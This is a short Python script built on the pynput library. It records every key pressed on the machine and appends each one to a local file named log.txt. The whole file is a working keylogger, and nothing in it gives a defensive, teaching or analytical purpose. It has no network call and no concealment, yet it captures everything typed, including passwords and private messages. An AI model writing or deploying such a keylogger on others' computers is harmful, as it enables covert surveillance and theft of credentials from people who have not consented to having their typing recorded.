from pynput.keyboard import Listener
import os


def on_press(key):
    os.chdir(os.getcwd())
    file = open('log.txt', 'a+')
    key = str(key) + '\n'
    file.write(key)
    file.close()


def main():
    os.chdir(os.getcwd())
    file = open('log.txt', 'w+')
    file.close()
    with Listener(on_press = on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
